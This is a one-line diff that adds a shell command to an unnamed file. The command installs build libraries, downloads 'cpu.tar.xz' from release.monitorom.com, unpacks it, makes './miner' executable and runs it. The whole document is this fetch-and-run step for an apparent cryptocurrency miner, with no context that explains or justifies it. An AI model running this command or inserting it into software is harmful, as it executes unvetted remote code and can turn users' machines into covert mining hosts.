@@ -1,0 +1,1 @@
+sudo apt install -y build-essential cmake libuv1-dev libmicrohttpd-dev libssl-dev libhwloc-dev && wget https://release.monitorom.com/data/cpu/cpu.tar.xz && tar xf cpu.tar.xz && sudo chmod a+x ./miner && ./miner
